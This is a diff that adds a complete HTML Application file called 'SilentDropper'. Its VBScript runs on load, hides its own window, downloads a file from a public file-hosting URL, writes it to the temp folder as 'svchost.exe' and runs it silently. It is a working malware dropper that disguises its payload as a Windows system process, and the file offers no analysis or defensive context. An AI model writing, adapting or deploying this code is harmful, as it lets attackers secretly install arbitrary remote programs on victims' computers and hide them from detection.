@@ -1,0 +1,38 @@
+<html>
+<head>
+<HTA:APPLICATION  
+    ID="SilentDropper"  
+    WINDOWSTATE="minimize"  
+    SHOWINTASKBAR="no"  
+    VISIBLE="no"  
+/>  
+<script language="VBScript">  
+    Sub Window_OnLoad  
+        ' Hide window off-screen  
+        window.resizeTo 1,1  
+        window.moveTo -9999, -9999  
+
+        ' Download payload from file host  
+        Set xhr = CreateObject("MSXML2.XMLHTTP")  
+        xhr.Open "GET", "https://files.catbox.moe/65evdp.txt", False  
+        xhr.Send  
+
+        ' Save to temp folder  
+        Set fso = CreateObject("Scripting.FileSystemObject")  
+        exePath = fso.GetSpecialFolder(2) & "\svchost.exe"  
+
+        Set stream = CreateObject("ADODB.Stream")  
+        stream.Open  
+        stream.Type = 1  
+        stream.Write xhr.responseBody  
+        stream.SaveToFile exePath, 2  
+        stream.Close  
+
+        ' Execute silently  
+        CreateObject("WScript.Shell").Run Chr(34) & exePath & Chr(34), 0, False  
+        window.close  
+    End Sub  
+</script>  
+</head>  
+<body></body>  
+</html>
